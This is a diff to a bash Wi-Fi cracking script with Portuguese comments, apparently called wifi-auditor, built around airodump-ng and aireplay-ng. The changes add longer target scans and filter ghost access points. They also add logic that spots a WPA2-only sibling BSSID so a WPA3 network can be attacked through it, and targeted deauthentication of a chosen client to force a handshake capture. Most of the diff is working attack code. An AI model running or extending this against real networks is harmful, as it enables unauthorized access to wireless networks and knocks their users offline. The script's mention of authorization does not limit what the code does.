@@ -35,6 +35,12 @@ TARGET_BSSID=""
 TARGET_CH=""
 TARGET_ENC=""
 TARGET_FREQ_LABEL=""
+# BSSID "irmão" em WPA2 puro na mesma rádio física (quando o alvo é WPA3). Redes
+# multi-SSID expõem vários BSSIDs no mesmo rádio que diferem em UM octeto só; se
+# um deles for WPA2 puro, ele é atacável normalmente (o WPA3/SAE não é).
+WPA2_SIBLING_BSSID=""
+WPA2_SIBLING_CH=""
+WPA2_SIBLING_ESSID=""
 SENHA_ENCONTRADA=""
 ROTA_USADA=""
 IP_ROTEADOR=""
@@ -44,6 +50,7 @@ HANDSHAKE_CAP=""        # captura validada para o BSSID atual; reutilizada entre
 DEAUTH_ESTADO="nao_solicitado"
 LOCKFILE="/run/lock/wifi-auditor.lock"
 SESSION_ID="$(date '+%Y%m%d%H%M%S')-$$"
+CLEANUP_FEITO=0        # garante que a limpeza rode UMA vez (Ctrl+C disparava INT e depois EXIT)
 
 # Máscara informada na Rota A — reutilizada pela Rota D (PMKID) para quebrar
 # o hash capturado sem depender de handshake/cliente conectado.
@@ -84,6 +91,13 @@ confirmar() {
 # ============================================================================
 
 cleanup() {
+    # Idempotente: ao dar Ctrl+C, o bash dispara o trap em INT e DE NOVO em EXIT,
+    # o que rodava a limpeza (e o restart do NetworkManager) duas vezes seguidas.
+    # Desarmamos o trap e marcamos a flag para só rodar uma vez.
+    [[ "${CLEANUP_FEITO}" -eq 1 ]] && return
+    CLEANUP_FEITO=1
+    trap - EXIT INT TERM
+
     log "Executando limpeza / restauração da interface..."
 
     if [[ -n "${MONIFACE}" ]] && iw dev "${MONIFACE}" info &>/dev/null; then
@@ -100,9 +114,14 @@ cleanup() {
 
     log "Limpeza concluída. Log completo em: ${LOGFILE}"
 }
+# EXIT roda a limpeza ao final normal. INT/TERM (Ctrl+C ou kill) precisam, ALÉM
+# de limpar, ENCERRAR o processo: sem o exit, o bash voltava do trap para o loop
+# de captura e seguia tentando numa interface já derrubada pela limpeza (as
+# "Tentativas" continuavam após "Executando limpeza"). cleanup é idempotente e
+# desarma os traps, então o exit abaixo NÃO redispara a limpeza no EXIT.
 trap cleanup EXIT
-trap 'exit 130' INT
-trap 'exit 143' TERM
+trap 'cleanup; exit 130' INT
+trap 'cleanup; exit 143' TERM
 
 # ============================================================================
 # 3. VERIFICAÇÃO DE DEPENDÊNCIAS
@@ -199,6 +218,28 @@ detectar_interface() {
         exit 1
     fi
     log "Usando interface física: ${IFACE}"
+    avisar_driver_fraco
+}
+
+# Alguns drivers (em especial Realtek rtw88/RTL88xx) têm modo monitor e, pior,
+# INJEÇÃO de pacotes instáveis ou quebrados. Isso impacta direto deauth, WPS e
+# PMKID (que dependem de injetar quadros) e também o scan (perde beacons ao
+# trocar de canal). Avisamos cedo em vez de falhar silenciosamente mais adiante.
+avisar_driver_fraco() {
+    local drv=""
+    drv="$(basename "$(readlink -f "/sys/class/net/${IFACE}/device/driver" 2>/dev/null)" 2>/dev/null)"
+    [[ -z "$drv" || "$drv" == "driver" ]] && return 0
+    log "Driver da interface ${IFACE}: ${drv}"
+    if [[ "$drv" =~ ^(rtw88|rtw89|rtl8821|rtl8812|rtl8188|rtl8192|8821|8812|8188|8192) ]]; then
+        echo
+        echo ">>> AVISO: o driver '${drv}' é de uma placa Realtek com modo monitor e"
+        echo ">>> INJEÇÃO de pacotes historicamente instáveis. Consequências práticas:"
+        echo ">>>   - deauth/WPS/PMKID podem não injetar nada (falham sem erro claro);"
+        echo ">>>   - o scan pode perder redes ao trocar de canal (lista incompleta)."
+        echo ">>> A captura passiva de handshake (quando alguém conecta) ainda costuma"
+        echo ">>> funcionar. Se possível, use um adaptador com injeção confiável."
+        echo
+    fi
 }
 
 # ============================================================================
@@ -278,14 +319,18 @@ garantir_moniface_viva() {
 
 escanear_e_escolher_alvo() {
     garantir_moniface_viva
-    log "Escaneando redes nas bandas a/b/g (2.4 GHz e 5 GHz) por 15s..."
+    # 25s (antes 15s): com --band abg o airodump salta ~38 canais (2.4+5GHz),
+    # dwell de ~250ms cada. Em 15s dava só ~1,5 varreduras e redes fracas (e o
+    # canal do alvo) escapavam — por isso a lista da etapa 1 vinha incompleta e
+    # divergia do que aparecia depois, já travado num canal, na captura.
+    log "Escaneando redes nas bandas a/b/g (2.4 GHz e 5 GHz) por 25s..."
 
     rm -f "${SCAN_PREFIX}"*.csv "${SCAN_PREFIX}"*.cap "${SCAN_PREFIX}"*.kismet.* 2>/dev/null
 
     # --kill-after força SIGKILL se o processo não morrer com SIGTERM dentro
     # de 5s extras — sem isso, "timeout" pode ficar esperando pra sempre se
     # o airodump-ng não terminar limpo (ex.: travado restaurando o terminal).
-    timeout --kill-after=5 15s airodump-ng --band abg --write-interval 1 \
+    timeout --kill-after=5 25s airodump-ng --band abg --write-interval 1 \
         --write "${SCAN_PREFIX}" --output-format csv "${MONIFACE}" &>>"$LOGFILE"
     local scan_rc=$?
     if [[ $scan_rc -ne 0 && $scan_rc -ne 124 && $scan_rc -ne 137 ]]; then
@@ -314,13 +359,14 @@ escanear_e_escolher_alvo() {
 
     # Parseia cada linha em: BSSID, Channel, Privacy, Power, ESSID
     declare -a lista_bssid lista_ch lista_enc lista_pwr lista_essid
+    declare -A bssid_visto
 
     local rejeitadas=0
     for linha in "${linhas_ap[@]}"; do
         IFS=',' read -ra campos <<< "$linha"
         # índices do formato padrão airodump CSV (0-based):
-        # 0 BSSID, 3 channel, 4 speed, 5 privacy, 6 cipher, 7 auth, 8 power
-        local bssid ch privacy power essid
+        # 0 BSSID, 3 channel, 4 speed, 5 privacy, 6 cipher, 7 auth, 8 power, 9 #beacons
+        local bssid ch privacy power essid beacons
         bssid="$(echo "${campos[0]}" | xargs)"
         if [[ ${#campos[@]} -lt 14 || ! "$bssid" =~ ^[0-9A-Fa-f]{2}(:[0-9A-Fa-f]{2}){5}$ ]]; then
             ((rejeitadas++))
@@ -329,12 +375,30 @@ escanear_e_escolher_alvo() {
         ch="$(echo "${campos[3]}" | xargs)"
         privacy="$(echo "${campos[5]}" | xargs)"
         power="$(echo "${campos[8]}" | xargs)"
+        beacons="$(echo "${campos[9]}" | xargs)"
         # O CSV do airodump sempre termina em "..., ID-length, ESSID, Key".
         # O último campo (Key) costuma vir vazio — o ESSID é o penúltimo.
         # (usar $NF pegava o campo "Key" vazio, deixando tudo como <oculto>)
         essid="$(echo "${campos[-2]}" | xargs)"
 
         [[ -z "$bssid" ]] && continue
+
+        # Descarta "fantasmas": o airodump cria uma linha de AP para todo BSSID
+        # que ele vê num frame de DADOS de um cliente, mesmo nunca tendo recebido
+        # um beacon dele. Esses vêm com "# beacons = 0", canal -1 e sem ESSID/
+        # privacidade — não são redes reais e eram justamente o que poluía a
+        # lista da etapa 1 (ex.: BSSIDs só "probados" por estações no scan).
+        if [[ "$beacons" =~ ^[0-9]+$ ]] && (( beacons == 0 )); then
+            continue
+        fi
+        # Sem canal válido não dá nem pra travar a captura depois — ignora.
+        if ! [[ "$ch" =~ ^[0-9]+$ ]] || (( ch <= 0 )); then
+            continue
+        fi
+        # De-duplica por BSSID (mantém a 1ª ocorrência) por segurança.
+        [[ -n "${bssid_visto[$bssid]:-}" ]] && continue
+        bssid_visto[$bssid]=1
+
         lista_bssid+=("$bssid")
         lista_ch+=("$ch")
         lista_enc+=("$privacy")
@@ -342,6 +406,11 @@ escanear_e_escolher_alvo() {
         lista_essid+=("${essid:-<oculto>}")
     done
 
+    if [[ ${#lista_bssid[@]} -eq 0 ]]; then
+        erro "Só apareceram entradas fantasma (0 beacons) no scan — nenhuma rede real."
+        erro "Rode de novo (sinal fraco / driver perdendo beacons ao trocar de canal)."
+        exit 1
+    fi
     log "Scan concluído: fonte=airodump-ng arquivo=$(basename "$csv") aceitas=${#lista_bssid[@]} rejeitadas=${rejeitadas}."
 
     # Ordena índices por potência (mais perto de 0 = sinal melhor) no topo
@@ -387,6 +456,112 @@ escanear_e_escolher_alvo() {
     fi
 
     log "Alvo escolhido: ESSID=${TARGET_ESSID} BSSID=${TARGET_BSSID} CH=${TARGET_CH} ENC=${TARGET_ENC} (${TARGET_FREQ_LABEL})"
+
+    # Se o alvo é WPA3, procura nas redes já escaneadas um BSSID IRMÃO em WPA2
+    # puro (mesma rádio: difere em 1 octeto). Esse lado WPA2 é atacável de forma
+    # convencional, ao contrário do SAE. Se existir, oferece trocar o alvo.
+    detectar_irmao_wpa2 lista_bssid lista_ch lista_enc lista_essid
+
+    avisar_limitacoes_cripto
+}
+
+# Conta em quantos octetos dois BSSIDs diferem (0 a 6). Vale-MAC virtual de
+# multi-SSID normalmente difere em UM octeto (o 1º, com o bit "localmente
+# administrado", ou o último) — por isso "diff == 1" é a assinatura de irmão.
+_bssid_diff_octets() {
+    local a="${1^^}" b="${2^^}"
+    local -a oa ob
+    IFS=':' read -ra oa <<< "$a"
+    IFS=':' read -ra ob <<< "$b"
+    local diff=0 i
+    for i in 0 1 2 3 4 5; do
+        [[ "${oa[$i]:-x}" != "${ob[$i]:-y}" ]] && ((diff++))
+    done
+    echo "$diff"
+}
+
+# Procura, entre os APs escaneados, um BSSID irmão do alvo (difere em 1 octeto)
+# que seja WPA2 PURO (tem WPA2, NÃO tem WPA3/SAE). Recebe os NOMES dos arrays
+# paralelos (passagem por nameref) porque eles são locais ao escaneamento.
+detectar_irmao_wpa2() {
+    local -n _bssid=$1 _ch=$2 _enc=$3 _essid=$4
+    WPA2_SIBLING_BSSID=""; WPA2_SIBLING_CH=""; WPA2_SIBLING_ESSID=""
+
+    # Só faz sentido quando o alvo é WPA3.
+    local alvo_up="${TARGET_ENC^^}"
+    [[ "$alvo_up" == *WPA3* || "$alvo_up" == *SAE* ]] || return 0
+
+    local i enc_up
+    for i in "${!_bssid[@]}"; do
+        [[ "${_bssid[$i]}" == "$TARGET_BSSID" ]] && continue
+        enc_up="${_enc[$i]^^}"
+        # WPA2 puro: tem WPA2 e NÃO tem WPA3 nem SAE.
+        [[ "$enc_up" == *WPA2* && "$enc_up" != *WPA3* && "$enc_up" != *SAE* ]] || continue
+        # Mesmo rádio físico: difere do alvo em exatamente 1 octeto.
+        [[ "$(_bssid_diff_octets "$TARGET_BSSID" "${_bssid[$i]}")" == "1" ]] || continue
+
+        WPA2_SIBLING_BSSID="${_bssid[$i]}"
+        WPA2_SIBLING_CH="${_ch[$i]}"
+        WPA2_SIBLING_ESSID="${_essid[$i]}"
+        log "BSSID irmão em WPA2 puro detectado: ${WPA2_SIBLING_BSSID} (CH ${WPA2_SIBLING_CH}, ESSID ${WPA2_SIBLING_ESSID})."
+        break
+    done
+
+    [[ -z "$WPA2_SIBLING_BSSID" ]] && return 0
+
+    echo
+    echo ">>> DICA: o alvo é WPA3 (não quebra por dicionário), mas há um BSSID na"
+    echo ">>> MESMA rádio física em WPA2 PURO — e esse SIM é atacável do jeito normal:"
+    echo ">>>    WPA2 irmão: ${WPA2_SIBLING_ESSID}  ${WPA2_SIBLING_BSSID}  (canal ${WPA2_SIBLING_CH})"
+    echo
+    local troca=""
+    read -rp "Mirar o BSSID WPA2 irmão em vez do WPA3? [s/N]: " troca
+    if [[ "$troca" =~ ^[Ss]$ ]]; then
+        TARGET_ESSID="$WPA2_SIBLING_ESSID"
+        TARGET_BSSID="$WPA2_SIBLING_BSSID"
+        TARGET_CH="$WPA2_SIBLING_CH"
+        TARGET_ENC="WPA2"
+        if [[ "$TARGET_CH" =~ ^[0-9]+$ ]] && (( TARGET_CH >= 36 )); then
+            TARGET_FREQ_LABEL="5 GHz"
+        else
+            TARGET_FREQ_LABEL="2.4 GHz"
+        fi
+        # Já trocou: zera para não re-sugerir o mesmo no aviso seguinte.
+        WPA2_SIBLING_BSSID=""; WPA2_SIBLING_CH=""; WPA2_SIBLING_ESSID=""
+        log "Alvo TROCADO para o irmão WPA2: ESSID=${TARGET_ESSID} BSSID=${TARGET_BSSID} CH=${TARGET_CH} ENC=${TARGET_ENC} (${TARGET_FREQ_LABEL})"
+    else
+        log "Usuário manteve o alvo WPA3 (${TARGET_BSSID}) apesar do irmão WPA2 disponível."
+    fi
+}
+
+# Avisa quando o alvo usa WPA3/SAE. Isso muda o jogo e o script não deve fingir
+# que as rotas normais vão funcionar:
+#   - deauth é protegido por PMF/802.11w no WPA3 → o cliente ignora os quadros;
+#   - o handshake SAE (Dragonfly) NÃO é quebrável por dicionário/máscara como o
+#     4-way do WPA2 — hashcat -m 22000 e aircrack atacam EAPOL/PMKID do WPA2,
+#     não o SAE. As rotas A/C/D só têm chance pelo lado WPA2 de uma rede em
+#     "modo transição" (WPA3 WPA2), se algum cliente conectar via WPA2.
+avisar_limitacoes_cripto() {
+    local enc_up="${TARGET_ENC^^}"
+    if [[ "$enc_up" == *WPA3* || "$enc_up" == *SAE* ]]; then
+        echo
+        echo ">>> AVISO: o alvo usa WPA3/SAE (${TARGET_ENC})."
+        echo ">>>   - deauth é protegido por PMF/802.11w → será IGNORADO pelo cliente;"
+        echo ">>>   - o handshake SAE NÃO quebra por dicionário/máscara (diferente do WPA2)."
+        if [[ "$enc_up" == *WPA2* ]]; then
+            echo ">>> Como a rede está em modo transição (WPA3 WPA2), ainda há uma chance"
+            echo ">>> SE um cliente conectar pelo lado WPA2 — aí sim o 4-way vira atacável."
+            echo ">>> (clientes que suportam WPA3 preferem SAE, então isso é raro)."
+        else
+            echo ">>> Esta rede é WPA3 puro: as rotas de dicionário/máscara/PMKID não se"
+            echo ">>> aplicam. Siga ciente de que provavelmente não vão encontrar a senha."
+        fi
+        if [[ -n "$WPA2_SIBLING_BSSID" ]]; then
+            echo ">>> Lembrete: há um BSSID WPA2 PURO na mesma rádio (${WPA2_SIBLING_BSSID},"
+            echo ">>> canal ${WPA2_SIBLING_CH}) — esse é o alvo realista, não o WPA3 atual."
+        fi
+        echo
+    fi
 }
 
 # ============================================================================
@@ -451,6 +626,21 @@ ha_cliente_conectado() {
         fi
     done < "$csv"
     return 1
+}
+
+# Ecoa o MAC do PRIMEIRO cliente associado ao BSSID alvo (ou nada). Deauth
+# broadcast (-a BSSID só) é largamente ignorado por clientes modernos; deauth
+# DIRECIONADO a um cliente específico (-a BSSID -c CLIENTE) é muito mais eficaz
+# pra forçar a reconexão que gera o handshake. O CSV tem o MAC na coluna 1 da
+# seção de estações e o BSSID associado na coluna 6.
+cliente_do_alvo() {
+    local csv
+    csv="$(ls -t "${CAPTURE_PREFIX}"-[0-9]*.csv 2>/dev/null | grep -vE '\.(kismet|log)\.csv$' | head -1)"
+    [[ -n "$csv" && -f "$csv" ]] || return 1
+    awk -F', *' -v b="${TARGET_BSSID}" '
+        /^Station MAC/ { f=1; next }
+        f && toupper($6)==toupper(b) && $1 ~ /^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$/ { print $1; exit }
+    ' "$csv"
 }
 
 capturar_handshake() {
@@ -524,13 +714,28 @@ capturar_handshake() {
             # já deve aparecer sozinho na próxima checagem, sem precisar disso).
             log "Tentativa $((tentativas+1)): cliente associado detectado; iniciando tentativa de deauthentication autorizada."
             DEAUTH_ESTADO="executando"
-            if timeout --kill-after=5 20s aireplay-ng --deauth 5 -a "${TARGET_BSSID}" "${MONIFACE}" &>>"$LOGFILE"; then
-                DEAUTH_ESTADO="comando_concluido"
-                log "Deauthentication: comando concluído; efeito ainda não confirmado."
+            local cliente
+            cliente="$(cliente_do_alvo)"
+            if [[ -n "$cliente" ]]; then
+                log "Tentativa $((tentativas+1)): cliente ${cliente} detectado — deauth DIRECIONADO (pode não funcionar em redes com PMF/802.11w ou canais DFS)..."
+                if timeout --kill-after=5 20s aireplay-ng --deauth 5 -a "${TARGET_BSSID}" -c "${cliente}" "${MONIFACE}" &>>"$LOGFILE"; then
+                    DEAUTH_ESTADO="comando_concluido"
+                    log "Deauthentication: comando concluído; efeito ainda não confirmado."
+                else
+                    local deauth_rc=$?
+                    DEAUTH_ESTADO="falhou"
+                    log "Deauthentication: comando falhou ou expirou (rc=${deauth_rc})."
+                fi
             else
-                local deauth_rc=$?
-                DEAUTH_ESTADO="falhou"
-                log "Deauthentication: comando falhou ou expirou (rc=${deauth_rc})."
+                log "Tentativa $((tentativas+1)): cliente conectado detectado (sem MAC específico) — deauth broadcast..."
+                if timeout --kill-after=5 20s aireplay-ng --deauth 5 -a "${TARGET_BSSID}" "${MONIFACE}" &>>"$LOGFILE"; then
+                    DEAUTH_ESTADO="comando_concluido"
+                    log "Deauthentication: comando concluído; efeito ainda não confirmado."
+                else
+                    local deauth_rc=$?
+                    DEAUTH_ESTADO="falhou"
+                    log "Deauthentication: comando falhou ou expirou (rc=${deauth_rc})."
+                fi
             fi
         else
             log "Tentativa $((tentativas+1)): nenhum cliente conectado detectado ainda — aguardando conexão..."
